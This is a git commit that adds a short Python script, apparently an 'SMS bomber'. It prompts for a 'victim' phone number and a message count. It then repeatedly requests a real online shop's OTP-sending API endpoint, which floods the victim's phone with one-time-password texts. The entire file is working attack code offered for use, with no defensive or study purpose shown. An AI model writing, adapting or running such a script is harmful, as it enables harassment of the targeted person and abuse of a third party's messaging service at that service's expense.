d149184942eb8f9fa01282fd3d736c36a44eae14
stfomor <84955259+stfomor@users.noreply.github.com>
2021-07-25 18:22:55 +0600

    Add files via upload

---
+++ chahida.api.py
@@ -0,0 +1,12 @@
+import os
+import time
+from urllib import request
+phone=input("Enter Your Victim Number :")
+sms=int(input("Victim Attack SMS Ammount :" ))
+
+url ="https://admin.chahidaeshop.com/api/send/otp?mobile_number="+phone+""
+
+for a in range(sms):
+	request.urlopen(url)
+	print(str(a+1)+ "STF..... Sms Bombing SMS Sent ")
+	time.sleep(1)
